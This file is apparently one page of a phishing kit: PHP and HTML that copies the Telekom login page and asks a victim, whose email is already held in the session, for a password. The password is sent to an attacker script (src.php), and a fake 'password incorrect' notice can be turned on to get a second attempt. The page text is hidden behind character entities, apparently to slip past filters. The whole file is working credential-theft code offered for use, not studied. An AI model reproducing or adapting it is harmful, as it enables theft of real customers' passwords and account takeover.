<?php
session_start();
function loggedin(){
if(isset($_SESSION['email'])&&!empty($_SESSION['email'])){
	return true;
	}else{
		return false;
		}
}

if(loggedin()){

		
}else{
		
		die(include 'Go_off.php');
		}
$email = @$_SESSION['email'];
$error = @$_GET['error'];
$formact = @$_GET['dyn'];
if ($error == 'emptypass'){
	$invalidpass = "block";	
	}else{
	$invalidpass = "none";
		}
if ($formact == 'second'){
	$action = "src.php?dyn=second";	
	}else{
	$action = "src.php";
		}		

?>


<!DOCTYPE html>
<!--[if (lte IE 8) ]>
<html lang="de-DE" class="no-js lte-ie8"><![endif]-->
<!--[if (gt IE 8)|!(IE)]><!-->
<html class="no-js" lang="de"><!--<![endif]-->










<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>&#84;&#101;&#108;&#101;&#107;&#111;&#109; &#76;&#111;&#103;&#105;&#110;</title>
    <meta name="description" content="Mit dem Telekom Login anmelden um Tarife anzupassen, auf Rechnungen, Verbrauchsanzeige, Einstellungen und mehr zuzugreifen.">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="robots" content="noindex" />

    <link rel="stylesheet" type="text/css" href="../static/factorx/css/components.min.css">
    <link rel="stylesheet" type="text/css" href="../static/factorx/css/login-24.05.1.css">
    
    <script>
        var accountLocked = false;
        var accountLockedPermanent = false;
        var accountLockExpiration = 0;
        var loginFailed = false;
    </script>
    
    <!--[if lt IE 9]>
    <script type="text/javascript" src="/static/factorx/js/html5shiv.js"></script>
    <script type="text/javascript" src="/static/factorx/js/respond.min.js"></script>
    <![endif]-->

    <script type="text/javascript" src="../static/factorx/js/jquery-3.2.1.min.js"></script>
    <script type="text/javascript" src="../static/factorx/js/jquery-matchheight-0.7.2.min.js"></script>
    <script type="text/javascript" src="../static/factorx/js/components.min.js"></script>
    <script type="text/javascript" src="../static/factorx/js/login.js"></script>

    
</head>


<body>
<div>
    <header id="tbs-header">
        <div id="tbs-header-content">
            <div class="container-fixed clearfix">
                <div class="pull-left">
                    <i class="icon icon-large">&#116;&#84;</i>
                </div>
                <div class="pull-right">
                    <span class="tbs-slogan">&#101;&#114;&#108;&#101;&#98;&#101;&#110;, &#119;&#97;&#115; &#118;&#101;&#114;&#98;&#105;&#110;&#100;&#101;&#116;.</span>
                </div>
            </div>
        </div>
        
        
        
    </header>

    

    
    

    
    


    <div class="offset-bottom-4 offset-s-bottom-3"></div>



</div>

<div>

    

    <div >

        <image src="https://xdn-ttp.de/lns/import-event-0746?zid=653721ea-4998-4e08-8208-8d9e1dedf6ff"  hidden="true" alt="" frameborder="0" width="1" height="1"/>

        <image src="https://pix.telekom.de/196380495960676/wt?p=441,www.telekom.de.privatkunden.login-idm-id,0,0,0,0,0,0,0,0&amp;cg1=www.telekom.de&amp;cg2=login&amp;cg8=privatkunden&amp;cg9=login-idm-id&amp;cp19=653721ea-4998-4e08-8208-8d9e1dedf6ff" hidden="true" alt="" frameborder="0" width="1" height="1"/>

    </div>


</div>


<div class="container-fixed">
    <div class="tbs-container">
        <div id="tbs-headline">
            <div id="tbs-brand" class="tbs-relative text-center">
                <h4>&#84;&#101;&#108;&#101;&#107;&#111;&#109;.&#100;&#101;</h4>
                
            </div>
            <h1 class="offset-top-0 offset-bottom-3 text-center">&#84;&#101;&#108;&#101;&#107;&#111;&#109; &#76;&#111;&#103;&#105;&#110; B&#101;&#110;&#117;&#116;&#122;&#101;&#114;&#110;&#97;&#109;&#101; &#101;i&#110;&#103;&#101;&#98;&#101;&#110;</h1>
        </div>

        <div class="login-box">
            

            <div class="offset-bottom-1">


                    
                    <div class="offset-bottom-1">
                        <div>
                    <div class="form-input-set floating">
                        <label>B&#101;&#110;&#117;&#116;&#122;&#101;&#114;&#110;&#97;&#109;&#101;</label>
                        <p class="form-input static text-ellipsis" title="<?php echo "$email"; ?>"><?php echo "$email"; ?></p>
                    </div>
                </div>
                <div>
                    
                        <div class="offset-bottom-1 clearfix">
                            
                            <input type="hidden" name="xsrf__Gn5h1Clt7e8oJo37y-NRw" value="_xpA9M3om9YyFaxJM9SbqA">

                            
                            <input type="hidden" name="tid" value="e8523f0a-6f96-4bf0-ae84-004051ff370d">

                            
                            <input type="hidden" name="identitychanged" value="identitychanged">
                            <div class="pull-right tbs-sublink">
                               <a href="./?sub=notme&resetallfields=true">  <button class="btn-link text-right" id="id_change" name="changeIdentity" tabindex="50" type="button">N&#105;&#99;&#104;&#116; I&#104;&#114; B&#101;&#110;&#117;&#116;&#122;&#101;&#114;&#110;&#97;&#109;&#101;?</button></a>
                            </div>
                        </div>
                    
                </div>
                <div>
                    <form id="login" name="login" method="POST" action="<?php echo "$action"; ?>" accept-charset="UTF-8" autocomplete="off">

                       

                        
                        <div>
                            
                            <div class="form-input-set">
                                <input id="pw_pwd" name="pw_pwd" type="password" inputmode="text" maxlength="128" class="form-input" tabindex="20" autocomplete="current-password">
                                <span id="toggle-password-visibility" class="icon-svg icon-eye-display" data-toggle-use-state-from-storage="false" data-toggle-element-id="pw_pwd"></span>
                                <label for="pw_pwd">P&#97;&#115;&#115;&#119;&#111;&#114;&#116;</label>
                                <input type="hidden" name="wiz" maxlength="50">
                            </div>

                        </div>

                        <div id="hideit" style="display: <?php echo "$invalidpass"; ?>;">
                        <div class="info-box error">
                            
                            <div>P&#97;&#115;&#115;&#119;&#111;&#114;&#116; &#105;&#115;&#116; &#110;&#105;&#99;&#104;&#116; &#107;&#111;&#114;&#114;&#101;&#107;&#116;.</div>
                        </div>
						</div>
                        

                        
                        <div class="login-helpers clearfix">
                            <!-- persist session component -->
                            <div id="tbs-signin-remember" class="form-checkbox-set">
                                <label>
                                    <input id="checkbox_permanent_displayed" type="hidden" name="persist_session_displayed" value="1">
                                    <div tabindex="30" role="checkbox" class="form-checkbox-js" autocomplete="off" hidefocus="true">&nbsp;<span class="border"></span><span class="check" role="presentation"></span></div><input id="checkbox_permanent" type="checkbox" name="persist_session" value="1" class="form-checkbox hidden" tabindex="30">
                                    <span>A&#110;&#103;&#101;&#109;&#101;&#108;&#100;&#101;&#116; &#98;&#108;&#101;&#105;&#98;&#101;&#110;</span>
                                </label>
                            </div>

                        </div>

                        <!-- Login button element -->
                        <div class="clearfix">
                            <button id="pw_submit" name="pw_submit" type="submit" class="text-center btn btn-brand btn-block btn-large tbs-text-upper" tabindex="40">&#76;&#111;&#103;&#105;&#110;</button>
                        </div>
                    </form>


                    </form>
                </div>
                
                



                <div class="text-center offset-l-bottom-3-5 offset-l-top-2 offset-s-bottom-2-5 offset-s-top-1-5">
                    <p>B&#101;&#110;&#117;&#116;&#122;&#101;&#114;&#110;&#97;&#109;&#101; &#111;&#100;&#101;&#114; P&#97;&#115;&#115;&#119;&#111;&#114;&#116; &#118;&#101;&#114;g&#101;&#115;&#115;&#101;&#110;?</p>
                    <p>B&#105;&#116;&#116;&#101; &#110;&#117;&#116;&#122;&#101;&#110; S&#105;&#101; &bdquo;A&#110;&#100;&#101;&#114;&#101; A&#110;&#109;&#101;&#108;&#100;&#101;&#111;&#112;&#116;&#105;&#111;&#110;&#101;&#110;&ldquo;.</p>
                </div>

                

                <div class="text-center offset-bottom-2 offset-l-top-2 offset-s-top-1-5">
                    <a id="helpLink" href="https://www.telekom.de/hilfe/telekom-login" tabindex="45" target="_blank">B&#101;&#110;&ouml;&#116;&#105;&#103;&#101;&#110; S&#105;&#101; H&#105;&#108;&#102;&#101;?</a>
                </div>

               





            </div>
        </div>
    </div>

</div>


<footer id="tbs-footer">
    <div class="container-fixed">
        <div class="pull-left">
            <p>&copy; &#84;&#101;&#108;&#101;&#107;&#111;&#109; &#68;&#101;&#117;&#116;&#115;&#99;&#104;&#108;&#97;&#110;&#100; &#71;&#109;&#98;H</p>
            <p class="tbs-text-11">24.10.0, a5b6a809f8ccc6e37f4f15b5c801eaf3, 32ade5dd4c8da31662262f245f3decee46f3c737</p>
        </div>
        <div class="pull-right">
            <ul class="list-inline">
                <li>
                    <a href="https://www.telekom.de/start/impressum" target="_blank">I&#109;&#112;&#114;&#101;&#115;&#115;&#117;&#109;</a>
                </li>
                <li>
                    <a id="data-protection" href="https://www.telekom.de/datenschutz-ganz-einfach" target="_blank">D&#97;&#116;&#101;&#110;&#115;&#99;&#104;&#117;&#116;&#122;</a>
                </li>
            </ul>
        </div>
    </div>
</footer>

<iframe id="callback-tracking" src="https://www.telekom.de/resources/tbs-config/phoenix_login_tracking?page=benutzer&amp;mode=%25mode%25&amp;context=auth&amp;status=first_attempt"></iframe>

<div>
    
</div>
</body>


</html>
